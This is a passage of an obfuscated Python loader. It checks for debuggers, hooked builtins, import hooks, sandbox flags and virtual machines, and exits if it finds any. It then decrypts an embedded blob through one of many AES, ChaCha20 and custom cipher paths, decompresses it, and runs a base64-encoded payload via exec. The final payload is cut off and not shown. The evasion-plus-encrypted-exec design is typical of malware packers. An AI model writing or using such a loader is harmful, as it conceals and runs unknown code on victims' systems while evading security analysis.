    _mvxgx = bytes.fromhex("393f6a475d5e614c4c5f3b4464484b6e4c38483f7c646d5b596e5b4c6d5a7a3f3f786562416c657c384b3f62575d5c5d3f426e43556d656045627543413a6a4b3a7c38765b61757a6547466556785548447b6c5f43565b7b384c37423a7d3c3e406e6677694d55495a48755c6a7548764e563857495c4c7d796d4d574b76375a7c38366d3877595f4e5a453a60374168554e76757d773d3776653c5e7f3d4636593962644a76775f3b423d3b3b363a7b6746654576667637365b5b62784063476864433f6d3846766c415d4d3d47404d653939374e4c625a4368434b58775e4d565e6c4c646e395c49657b3a5a37485b62396260796d62784741395744557846763b3d657a5e487879426c425d484e78694964467d6e4d5d4937486b486a566a5645394c443c467a4b7a645578595e3739615d55645a797c667b62606a3a44366d764a7b7975643d4e414175375a6d65495b3775444d556b576a3639366639693d393c47555e6658794560676e6b4c7a363f426a4b4b676a396c694b586d45754b5a413b7e584a7b3a56655e366d416659465e573e3a7943366c5647796a4b664762614c4c76767e4c6743637f5d48594b76414a7c785657625b45777f7f39674d4e753c6578637c7f386a56437a49756b6b6358675f7b5f766c65766d5b3a6c7d4c576b494c36483c7c4a4a4936613860366e68424a594679757f4d4c495a7f42795c42487e5664374d63386c553e436a6d6e48456358636662765e3d6d4c556d7a7c4e7d6d644d466a39663c6d605d3b4e7e42624441675b46567a464d6b617e786e435a7538463f437d757d7e3b7c6262693e4562696138674068484b4736386c393e4468447b644a6176625d554b423a5f404964667a55634341557d6d44483e446d64673f3b4a79666e796638474746385f5e374948384968564d763d6d446740436464783f445d573f5b5f7a4c67385d786248757549757a4767376e7e655b6c5c4e78445a6e397e3d463d494565625f604d695e624b443e6b364358624e6e7a693937494c5f3a64485b6a6d6d626d7a77594c3d7a6c5a4d574d7a604b38593f404469436b7678666a367a5b647b766a427740677c39667e5e7b6d3d7a3d3f496b7962647b6b5d676c6b68766c653867363a605f6c624a485e5f6c47445d7e627c6a4d4e4b684440445d6165763d644b363957765968393e48794c457964766e6747635b6c7d3c7c7e47796656407b474a6e474b66473b6b69754d5c3c3d594749557d655e38464877486a625b7d49424b454866594e6337377658674d595d644a39677f626d4a78395b55567d60657b5d597a763d3a68447d4b5f4c7d7b3f373a4b653865634b455f48447869623f363e383c426c75425c37614e5b583b625e4e7c4b647d6b4a376476693e3b43795a416e3a3d364b4c555e39755b79")
    _mvxgx = bytes(_ ^ 15 for _ in _mvxgx).decode()
    _emigrbkrw.breakpointhook = None
    for _qm in ('pydevd','pdb','ipdb','pdbpp','pydevconsole'):
        if _qm in _emigrbkrw.modules:
            _emigrbkrw.stderr.write('error: debugger detected\n'); _emigrbkrw.exit(1)
    _xvpuhd = _tecqcxy.b64decode(_beqojjt)
    for _qn in ('__import__','compile','exec'):
        _qf = getattr(_emigrbkrw.modules.get('builtins'), _qn, None)
        if _qf is not None:
            _qg = getattr(_qf, '__name__', '')
            if _qg != _qn:
                _emigrbkrw.stderr.write('error: hook detected\n'); _emigrbkrw.exit(1)
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher as _pnlmphpo, algorithms as _oogfsz, modes as _tcykljtuu
    except ImportError:
        _emigrbkrw.stderr.write("error: cryptography not installed\n"); _emigrbkrw.exit(1)

    if len(_emigrbkrw.meta_path) > 5:
        _emigrbkrw.stderr.write('error: import hook detected\n'); _emigrbkrw.exit(1)
    if getattr(_emigrbkrw, 'flags', None) and _emigrbkrw.flags.no_user_site:
        _emigrbkrw.stderr.write('error: sandbox detected\n'); _emigrbkrw.exit(1)
    import os
    if any(x in str(_emigrbkrw.platform) or any(y in os.listdir('/proc/sys/kernel') for y in ['//', 'vm']) for x in ['vmware', 'virtualbox', 'qemu']):
        _emigrbkrw.stderr.write('error: virtual machine detected\n'); _emigrbkrw.exit(1)
    if _zvlal == 7:
        _dxrxafqct = _tecqcxy.b32decode(_xvpuhd)
    elif _zvlal == 5:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=64)
        _clmkcbscf = _muyuxut[:32]; _nyxgkrfg = _muyuxut[32:64]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _dxrxafqct = bytes(_iaewvb[i] ^ _clmkcbscf[i % 32] for i in range(len(_iaewvb)))
    elif _zvlal == 8:
        _yfvfxj = ('0','1','2','3','4','5','6','7','8','9',
                'A','B','C','D','E','F','G','H','I','J','K','L','M',
                'N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
                'a','b','c','d','e','f','g','h','i','j','k','l','m',
                'n','o','p','q','r','s','t','u','v','w','x','y','z',
                '!','#','$','%','&','(',')','*','+','-',';','<','=',
                '>','?','@','^','_','`','{','|','}','~')
        _lzmsunq = {c:i for i,c in enumerate(_yfvfxj)}
        def _pqzaz(_xvzipcza):
            _fydag = bytearray(); _lmnmyigl = 0
            while _lmnmyigl < len(_xvzipcza):
                _ucstd = 0; _oaonid = 0
                while _lmnmyigl < len(_xvzipcza) and _oaonid < 5:
                    _ucstd = _ucstd * 85 + _lzmsunq[chr(_xvzipcza[_lmnmyigl])]; _lmnmyigl += 1; _oaonid += 1
                _jgnogqom = _oaonid - 1
                if _jgnogqom > 0: _fydag.extend(_ucstd.to_bytes(4, 'big')[4-_jgnogqom:])
            return bytes(_fydag)
        _dxrxafqct = _pqzaz(_xvpuhd)
    elif _zvlal == 12:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=64)
        _clmkcbscf = _muyuxut[:32]; _nyxgkrfg = _muyuxut[32:64]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _zbaqijhj = 3 + (_mgsaip[0] & 7)
        _mgsaip = bytearray(_iaewvb)
        for _ludqlt in range(_zbaqijhj - 1, -1, -1):
            _gxwatyha = (3 + _ludqlt) & 7
            _bkzuq = (_ludqlt * 0x1B + 0x5A) & 0xFF
            for _aivusbmt in range(len(_mgsaip)):
                _zbaqijhj = _mgsaip[_aivusbmt]
                _zbaqijhj ^= _bkzuq
                _zbaqijhj = ((_zbaqijhj >> _gxwatyha) | ((_zbaqijhj << (8 - _gxwatyha)) & 0xFF))
                _zbaqijhj ^= _clmkcbscf[(_ludqlt * len(_mgsaip) + _aivusbmt) % len(_clmkcbscf)]
                _mgsaip[_aivusbmt] = _zbaqijhj
        _dxrxafqct = bytes(_mgsaip)
    elif _zvlal == 6:
        _dxrxafqct = _tecqcxy.b64decode(_xvpuhd)
    elif _zvlal == 1:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=80)
        _clmkcbscf = _muyuxut[:32]; _aivusbmt = _muyuxut[32:48]; _nyxgkrfg = _muyuxut[48:80]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _qiuvz = _pnlmphpo(_oogfsz.AES(_clmkcbscf), _tcykljtuu.CBC(_aivusbmt))
        _dxrxafqct = _qiuvz.decryptor()
        _dxrxafqct = _dxrxafqct.update(_iaewvb) + _dxrxafqct.finalize()
        _zbaqijhj = _dxrxafqct[-1]
        if _zbaqijhj < 1 or _zbaqijhj > 16 or not all(_ == _zbaqijhj for _ in _dxrxafqct[-_zbaqijhj:]):
            _emigrbkrw.stderr.write("error: decryption failed\n"); _emigrbkrw.exit(1)
        _dxrxafqct = _dxrxafqct[:-_zbaqijhj]
    elif _zvlal == 9:
        def _zagoy(_ulqoo):
            if _ulqoo[:2] == b'<~': _ulqoo = _ulqoo[2:]
            if _ulqoo[-2:] == b'~>': _ulqoo = _ulqoo[:-2]
            _ktbyvro = bytearray(); _wepct = 0
            while _wepct < len(_ulqoo):
                if _ulqoo[_wepct] == 122:
                    _ktbyvro.extend(b'\x00\x00\x00\x00'); _wepct += 1; continue
                _lmuzevam = 0; _ycemuuaeg = 0
                while _wepct < len(_ulqoo) and _ycemuuaeg < 5:
                    _lmuzevam = _lmuzevam * 85 + (_ulqoo[_wepct] - 33); _wepct += 1; _ycemuuaeg += 1
                _hfqyvv = _ycemuuaeg - 1
                if _hfqyvv > 0: _ktbyvro.extend(_lmuzevam.to_bytes(4, 'big')[4-_hfqyvv:])
            return bytes(_ktbyvro)
        _dxrxafqct = _zagoy(_xvpuhd)
    elif _zvlal == 3:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM as _ipyxf
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _dxrxafqct = _xvpuhd[16:-32]
        _iaewvb = _dxrxafqct[:-16]; _zbaqijhj = _dxrxafqct[-16:]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=76)
        _clmkcbscf = _muyuxut[:32]; _aivusbmt = _muyuxut[32:44]; _nyxgkrfg = _muyuxut[44:76]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _dxrxafqct, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _dxrxafqct = _ipyxf(_clmkcbscf).decrypt(_aivusbmt, _iaewvb + _zbaqijhj, None)
    elif _zvlal == 4:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=80)
        _clmkcbscf = _muyuxut[:32]; _aivusbmt = _muyuxut[32:48]; _nyxgkrfg = _muyuxut[48:80]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _qiuvz = _pnlmphpo(_oogfsz.ChaCha20(_clmkcbscf, _aivusbmt), mode=None)
        _dxrxafqct = _qiuvz.decryptor().update(_iaewvb)
    elif _zvlal == 11:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=64)
        _clmkcbscf = _muyuxut[:32]; _nyxgkrfg = _muyuxut[32:64]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _zbaqijhj = _clmkcbscf[0]
        _dxrxafqct = bytearray()
        for _ludqlt in range(len(_iaewvb)):
            _mgsaip = _iaewvb[_ludqlt] ^ _zbaqijhj
            _dxrxafqct.append(_mgsaip)
            _zbaqijhj = _iaewvb[_ludqlt] ^ _clmkcbscf[ (_ludqlt + 1) % len(_clmkcbscf) ]
            _zbaqijhj = (((_zbaqijhj << 3) & 0xFF) | (_zbaqijhj >> 5)) ^ 0x5A
        _dxrxafqct = bytes(_dxrxafqct)
    elif _zvlal == 10:
        _dxrxafqct = bytes.fromhex(_xvpuhd.decode('ascii'))
    elif _zvlal == 2:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=80)
        _clmkcbscf = _muyuxut[:32]; _aivusbmt = _muyuxut[32:48]; _nyxgkrfg = _muyuxut[48:80]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _qiuvz = _pnlmphpo(_oogfsz.AES(_clmkcbscf), _tcykljtuu.CTR(_aivusbmt))
        _dxrxafqct = _qiuvz.decryptor().update(_iaewvb)
    elif _zvlal == 0:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=64)
        _clmkcbscf = _muyuxut[:32]; _nyxgkrfg = _muyuxut[32:64]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        _qiuvz = _pnlmphpo(_oogfsz.AES(_clmkcbscf), _tcykljtuu.ECB())
        _dxrxafqct = _qiuvz.decryptor()
        _dxrxafqct = _dxrxafqct.update(_iaewvb) + _dxrxafqct.finalize()
        _zbaqijhj = _dxrxafqct[-1]
        if _zbaqijhj < 1 or _zbaqijhj > 16 or not all(_ == _zbaqijhj for _ in _dxrxafqct[-_zbaqijhj:]):
            _emigrbkrw.stderr.write("error: decryption failed\n"); _emigrbkrw.exit(1)
        _dxrxafqct = _dxrxafqct[:-_zbaqijhj]
    elif _zvlal == 13:
        _mgsaip = _xvpuhd[:16]; _ukeqzyzev = _xvpuhd[-32:]; _iaewvb = _xvpuhd[16:-32]
        _muyuxut = _freytudp.pbkdf2_hmac('sha256', _mvxgx.encode(), _mgsaip, 100000, dklen=80)
        _clmkcbscf = _muyuxut[:32]; _aivusbmt = _muyuxut[32:48]; _nyxgkrfg = _muyuxut[48:80]
        _babdnpo = _hxnyayael.new(_nyxgkrfg, _iaewvb, digestmod='sha256').digest()
        if not _hxnyayael.compare_digest(_ukeqzyzev, _babdnpo):
            _emigrbkrw.stderr.write("error: integrity check failed\n"); _emigrbkrw.exit(1)
        import struct as _gkknhkbr
        def _gxwatyha(k,c,n):
            s=[0x61707865,0x3320646e,0x79622d32,0x6b206574]
            for i in range(0,32,4):s.append(_gkknhkbr.unpack('<I',k[i:i+4])[0])
            s.append(c&0xFFFFFFFF)
            for i in range(0,12,4):s.append(_gkknhkbr.unpack('<I',n[i:i+4])[0])
            w=list(s)
            def q(a,b,c,d):
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<16)|(d>>16))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<12)|(b>>20))&0xFFFFFFFF
                a=(a+b)&0xFFFFFFFF;d^=a;d=((d<<8)|(d>>24))&0xFFFFFFFF
                c=(c+d)&0xFFFFFFFF;b^=c;b=((b<<7)|(b>>25))&0xFFFFFFFF
                return a,b,c,d
            for _ in range(10):
                w[0],w[4],w[8],w[12]=q(w[0],w[4],w[8],w[12])
                w[1],w[5],w[9],w[13]=q(w[1],w[5],w[9],w[13])
                w[2],w[6],w[10],w[14]=q(w[2],w[6],w[10],w[14])
                w[3],w[7],w[11],w[15]=q(w[3],w[7],w[11],w[15])
                w[0],w[5],w[10],w[15]=q(w[0],w[5],w[10],w[15])
                w[1],w[6],w[11],w[12]=q(w[1],w[6],w[11],w[12])
                w[2],w[7],w[8],w[13]=q(w[2],w[7],w[8],w[13])
                w[3],w[4],w[9],w[14]=q(w[3],w[4],w[9],w[14])
            r=bytearray()
            for i in range(16):r.extend(_gkknhkbr.pack('<I',(s[i]+w[i])&0xFFFFFFFF))
            return bytes(r)
        _ludqlt = _gkknhkbr.unpack('<I',_aivusbmt[:4])[0]
        _aivusbmt = _aivusbmt[4:]
        _mgsaip = bytearray()
        while len(_mgsaip) < len(_iaewvb):
            _zbaqijhj = _gxwatyha(_clmkcbscf, _ludqlt, _aivusbmt)
            for _bkzuq in range(min(64, len(_iaewvb) - len(_mgsaip))):
                _mgsaip.append(_iaewvb[len(_mgsaip)] ^ _zbaqijhj[_bkzuq])
            _ludqlt += 1
        _dxrxafqct = bytes(_mgsaip)
    else:
        _emigrbkrw.stderr.write("error: unsupported algorithm\n"); _emigrbkrw.exit(1)
    _vk = bytes.fromhex("ecbfb71d91616c6860eedf5b4a15be8a025ca0b44165d387961a9fe6d0c0f182")
    _vn = bytes.fromhex("15a5cecc5925c51d52bf9414e41b6630")
    _sig = _dxrxafqct[-32:]
    _pl = _dxrxafqct[4:-32]
    import hmac, hashlib
    if not hmac.compare_digest(_sig, hmac.new(_vk, _pl, hashlib.sha256).digest()):
        _emigrbkrw.stderr.write('error: VM integrity check failed\n'); _emigrbkrw.exit(1)
    _pd = bytes([_pl[i] ^ _vk[i % 32] ^ _vn[i % 16] for i in range(len(_pl))])
    if _dxrxafqct[1] == 1:
        import zlib as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 2:
        import lzma as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 3:
        import bz2 as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 4:
        import brotli as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 5:
        import zstandard as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 6:
        import gzip as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 7:
        import lz4.frame as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 8:
        import snappy as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 9:
        import gzip as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    elif _dxrxafqct[1] == 10:
        import blosc as _ulnblcb
        _pd = _ulnblcb.decompress(_pd)
    else:
        pass
    _c, _k, _m, _map, _ok, _ht, _pf = _vm_deserialize(_pd)
    exec(compile(_tecqcxy.b64decode("aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgaG1hYwppbXBvcnQgY3R5cGVzCmltcG9ydCBiYXNlNjQKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGhtYWMKaW1wb3J0IGN0eXBlcwpfRlVOQ19LRVkgPSBiYXNlNjQuYjY0ZGVjb2RlKCd1S01GR255ZzhuYVBxU0JhOHFnblNEbmFCbHQ4Tk1pY1Q3WENaMFBHQWU4PScpCl9GRU5DX0RBVEEgPSBbYmFzZTY0LmI2NGRlY29kZSgndFJHVkR4RmdoaVJJLzRUOXpRNWE4aUNlTC8xdko5M0loZlJnV01MT1RodXZyTmhlMFlPckxWQWo0azFvNzRIekphaGg2M2daNmlOWG5FMDFtVHZTaXdjSmhIU0M4dHFvWGkzalEzUUVEZ0pGZUlQYVlRWjNqM01RZS9rSFltVXVZbE1GaDd6Y2o5QjBaSzN1ZmRaN2ZWelFLWFlhcEszOTBEcmxBZGptYkU2L29oa3h4eGVyazU5WXk1WmNKQzV2aVNvSEl0bmJDOUlwRm1GSHJieCtFZ1ZDeG11b1orNWx4UXF0bDRoeXErWmNzem9UeVJHLzR1dmh0dGgrMlVkVVhmTis3NGxDMFFUU1JIWTEvelB5dXF1VXAzTWFrQ0hnYVJ4K2xnT25ZSEtuSUtmTVMyaEJrdVlmYVQ4b0R3PT0nKSwgYmFzZTY0LmI2NGRlY29kZSgnTmdwRUdveUV6Zmt0S0MzNmE3UGtVUFI0TytIeE45MXdsOUszWWFrWmVpWTFWS3U3Z0ZjdTIvVEJOSkcydDBtRU80ekloWWI3NnA3bHFxZXUzQ0Y3YVZCaUJpb3VOOWtHQjZER2NKVzZUTW9XSktPQWVwZVR2Ulp0ZzdnUlAvVnpEeUdZN1dpZUpTRXc0N2p1WUFqRUdqczlvdFVrVGVzOVFZRCtHMVVpYVQxcHVIbFRrSC83V3NDcjhHazM4QmNERm5ZU3Vrc0FrV2Rnb1Z1VDVMREI5empsRXJTSnBGdGVDaUF4eE1RTmp4RW9ieWpyRTVLOEQwVFJaOVFrejJmSXJIdmZEdlZ3eXZZVzNjVCs3Y2Q1ZGlOS3NIa3hIU0piMUhmVmlES0JIWkJyQVAzMG9kST0nKSwgYmFzZTY0LmI2NGRlY29kZSgncVJiVkhyeXNzWCs0dzhuM09EUFRmUUpES3p2MDZaeWlTbk9PTkNFMkxSbDJ1RkJXOEdZcXVaVDRPTXo2RDRvQkp2WVQ2L0xodFArTXF1WFBNL3I2Z2tEaS8ralBSSzd0ZlVnRGVxdU15KzVoanA4NVdpcHdVbTM4ODhEQWZCWWxzMmNDTEFieVFuakI4b3E2Y0JiK0d5S1VmeXg1ak9Hcm9BZWZ1MTlwczUraXgrOVVGUTIrWmV0WUhpOUtTRmQ1cGUrTTRENHZwZ0FaZTBnWU5kNnJKb0xTWmd0b1h3ZW03UjJNUjJBQUpCQ2c0WnQ1dnF3ckxveXhqZ3lpbnpVQ2g5b3AyN1RaTWVQbUdvTGdMUytGS3FUb0o3UWhDUGUxM2tIZEZZc0xBbmF2UERDTXhqWllhV1FBUVU2OStETWFOdHhPeDBKMkNYTUIzajJkK1A4bC90bnEvUzA9JyksIGJhc2U2NC5iNjRkZWNvZGUoJ0ZSWTNUVHUyeFFEOFlzQk0wbnhYUFM1Q1F3WW5jV3hVR0VyRVAwN0tudUdwS2FRbVNrMkdhSG5xUE0wZnRmSG9PVlRwNWlNbXBnZ3gzUm4wM0ROOGQrK1JER1FKdVRtTVNhajFubm1WRW1BTEZpRW1aOGxOczlidzdOVWJ0bEpkZWE2QmxLZlVLa2NlY2pMOWJtbTZwaEQ0WDhBV05mNGoyNlhnc2J6azcvMjYxMmlNcWZUNVNYc0NLYTFjc3NYdnhRVEZBL3ZtWFJiUitKZUo5Mlh0Z0dtRGNZbmk2WG1BUU4yOG5oRnFXbDV5cmhPc0hyZjhPYzRRcHlrek9KL08ycjNQWUliWW9qSDgrRm1DdGFVWFNnbnFHQUR4Ylg1UjhrdmhHTjNSdEsvTWNCTitrenY2bHRSTHNCemFkU2l3dHVkdlZQV0FFYU1MRElvU3ArRnVmTk8rQVpyQTdIRmx5eGF6Yy9KTENGUDdyOWs1dUl5TGxGNW1WRHRRKzdrbHJvQjJxcXVPczVsSUUvb3Bsb2dldEI1MmdIZEFXdzJhMENjRDRSWVIzTUJHM28wa0FRbjNqQTNWNjNKUWE0UFk0azNmdTI1eGV4VmwySGl4M2tkK3NtV09Dc0hSODU1eVVmSDFzR2x0eDFMMkRpdzdXSlhJcnAvZEl4eXBLRWtxZnVqTzdGSlYrOEJCakhaNXIvVmNzSEpKRUdZYkcrWG1uUXlTVXN6Sk1DUUpXT0VBQ2NBNzdBZFF2YjZSVnB4TzIxaDc1aHpQNDl0ZC85K1JISm8vTTBuQlZkV3UrcWg0TXRXaU9SVjJvTjVEWnpaZmZ3SkFlQ054NzVsaVhMbjI2NjBqelZJcEpVa2lQeUJ4a0YxcXcvdWFpZHYwNjBWdnNSRlZubXBGWkNDWUdMSzJxRUREamNaV0kvQStEc28yN05OL3ZCTUdCVEwyUW52NW1SMXpXdHBjQVl3TkVTYjlVWTFxZGVYdXJuTmpvYVd4MWtqRXJDbHh4VTZ1YmR1anZ0RkxLbjBRd2k1TE5UcWhheEE3eEE5dUY4V3RBTFE0WjZwVnNSZlZhMElYZGxsQ0l6c3ErVjRmNWpnR0UzeFBjWElSME5jVkdldzdDUitvRnQ3MEhjeXBjYUxoTTFTcnRqV0d6cHdxVXVyaEpxZTVnTng0OWpNUWtVbXV2b2Z0cXExcEUvS2tQM1c5dkdibVM2TStDNDhRcjNiZ1lYZ1dheC96RTRObHQ0N2pwUHEzb25iVlNIdW5SVW5JVmlXb3VqUFNhOEIxS2xXaW5TVFVrVjZDR3NJS3cwZllISnE5RmxhV3BTZTdSMC92RDRRV2dueU5oaDZpRUphdXQ4di9QZDZUNnNoQ1plVFV2WXQycEx5SEE1WlRjaWdZNEpHZHBHQ2hZbTlXcHJMT3VxWGh0TDd1dmN4UXhMTGJlSGJob2dOeDlveitHcEQ0aUJhOU5MNTFYZnhTUWh3NHpiZnpkOGFlMHJ4VlplVjlUcEJURTJodFU3RXNPMXFsMjVBT1dVS1ZDUkJLQnpuY3cyeXBveXJHWGFoRGJ3R3FTTFVCdnJSa3BlVTcyaWlYSTd3K1hqdWFnTDdYUnV2QlgybG9BQkpEMVdxbkF3eGxZSHBsZ3BKdm5HYms0azE3b0Vub09Ub3JQZWxYNStJYjY3ZU54VVhxN2xnYndmNGdmQURqWnEvYXN5S1J4c3NRdVA0Y0RpT2FJaWdmZFRpd2wzTUwvUEZZNDJTL0RVR2RjUUZ1S1Fkc0dQOHRTYncwRnE1THVQYWlQRXBxbVNvVGg3RnU2VHVzUkhRbkR1QWxEbDlRL2tucHNlMjhQWEk0WG01eUlzMGxnZ0RCVnQvQUdoUUtRUUR1bmp2YmQ4Uks5R0V5QlBQK2Zid3JCSnFPSG0vZHBqN0N5VnFBbFpDQzF2akNVMDFEVnlON0tXM3J0c2lZc1graVF1S1d0cnY1VHFiZmZJSkx1elFJeXZMMWN5TC9SdUFWaUQ4blE1L05EblFEb3VXYTd6SUZzTFVYNFpTRW1sQ3k2bEtNN2tkdkY3VnNSNzhtRzlCazE3MGdpa2o0RmdwQ1d2cDAvS0NIWExlNi90b29aUDJoN0tia3ZWVlZNUXIrZDNZOS85b1ZKNFF6VFJETVVyNVUxSlV1dHE2WU54QlA3WU5GaTFXS3ZIM0NBOE5oODBkS1MyOWJYOGdSeWpMMHdvTGdoNEtkOTVoSTFib0kwUjR4U2VDR1E3NlNobGZhKzBKU3Z3aENGTXNsSExISVJLRGxQK3hKc1dFVjZON2pQUGQ3VThSNHNLRlNEdytjR0VtTStPT2llUWdCUFREdGFCd0RUbXB4dGt1VlN5K0Zwcy9SOVpIWGdud0NvdWpOQ3VzemZaZjRxVC9BS2xQWW9xSldnY1VHUGx5c3A1N2ttVytJU1RKaEVJMThlakV4QzJreDZCSVNJdzRucHJiNFBTMkpIa05OZWhXNTVVdXR0NWRlb1J4SjFBMlFLM3Jpb042d0lPLzg3QWtveWVnZng3UTYvUmMydEpzckl1d2hlTGs1RWF6K2VvNm9RUUh4d0p1SjQ3T1plUWtjWHhaR3BFSXh4Q3hXcG0rUWlRblpublc4ZFU4RGdKV2dEaTVQVTc5K2JHZ1B5bnNSSkNoN0ZUVE5mWC9aRWc0aDhJanhIaHFGdE5ENy9xczJqL1N1Z0dJdFlLMks1WEowREJBMkZCOENkR21QOVl3MHF0U0pVYmxzQzZ6RXlpSWQwV3hDMm0xSXZZY2ZScGRnMVgrZmpWOWpNcnJpeGY0ODhaN3ZYTkVXZVVvN0FPOHhSem1jT2ttRUZjaHdwWE1PQlJHa1BTN3l1UkJvZkdobVdxTGtMUUc1aXdHYnN6VHRwZ2hXd1d2YklYWDVZS21pNlpuWXEwZUxzZG9acUdrdjFKdWpSSHFIbFRmUVljc2dXR0RMc1JTVmE0N3BrRkRSeDZHc3B6SVFUNFJUWXJSeXJQRXlnYVY2TlRaVGhBbkZ3Y0dTUTl4SE1pRzBnYSsrNDlsOXR4L1hldVkzZTVQWkZMc1YzTDFJc0NVR01wVlg3aXI3dGJNV2xOUVlQbmR6Nzl3TnlnWFpRTm9lY3NkL29VTHBNVm5Ed3dYQWpLMFQrM2h2RmJLenQ1MXRJTnNFdyt4dGl2N2ljVUY4cWIwM2tKbUtnYThiWUh3Y3hmR3Y4SkVXelM4U2o2bUt2ZWpHZkJ1dFNDZ0JYbUgrMytTMi9Zc3ZqMGtDVlR4V2VvdkRGdDB3NmlMOTk2QXArU2ZLUktnZ1d6Z0cwcDE5aVlRNXpSWG9VYk5VcjIvSVhESlFqbWd5cEpqRW9IUERuQW1aN29hbEpSbXlXc1RJTWdCU2dPY0hyN0EwWmVGcVprSlNITml0Wmx5OVZoMWNuSFBtQmZXWXdEa3ZZZE1reDYvTEFoaVlNZWxGWlRubUVyb0d2WE8yc3lOdFRqdy9KOFNrWVh6VmFMOFQ4SUNaYWZQTlJmOGhZQ3FoOGxJVkZmV3pNNk9CaStlYnNrc1lNOEZRdktXK1laaWE5RUczYktvZmdxK0RVUHhJWnlhT3FWOHZOZTNqSzZxQXRXVWk0aXpJcUsrdnlpQWFkWThrS2l6RVcxWXhEbW83MFVHY2FkZkpTcnBJRUY1S0loTDBpbkdFbndwSW9TSVhEc3ZIczYvQzVEekw1bEVERWxlRG9qQmU1Z01TeGlXcVBnQXJrTzY3YXJIYkduc2hTQ2hZOWxxTFlrbS9XREx1QUdWTGJWQVZmVkZaMFJKQTBPVVNUQnUwZmUzckRzeXVjOHhOa0MwUk5zNXpGK1RDT1lZZHk5Y2NjbXl6Y3Y4WjgrUm1TRlRIRWhoSCszQ0t0ZmVjNnJzTitsZEV0eVBSZWExYlN1U0V3TVNLS2djVzVDSmJNS052WW1KOFZyOUwvQjJPSGxXK01rR2pzckdRSjhoUlBrQmNydDJ0ektVWkRvUElwb2pkY3NFcnVDVm0vOHB3aV